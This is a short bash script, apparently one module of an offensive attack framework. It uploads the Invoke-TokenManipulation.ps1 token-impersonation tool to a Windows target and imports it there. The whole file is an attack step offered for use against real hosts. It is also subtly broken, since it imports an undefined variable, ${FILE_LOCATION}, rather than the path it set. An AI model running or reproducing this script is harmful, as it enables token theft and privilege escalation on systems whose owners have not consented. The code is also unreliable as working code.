#!/bin/bash

: '
ps: Upload and import module Invoke-TokenManipulation.ps1
'

LOCATION="${SCRIPTS_DIR}/reconnaissance/windows/activeDirectroy/invokeTokenManipulation/.files"
FILE="Invoke-TokenManipulation.ps1"

ps_webclient_upload_file "${LOCATION}" "${FILE}"

execute_command "Import-Module ${FILE_LOCATION}"
create_new_line
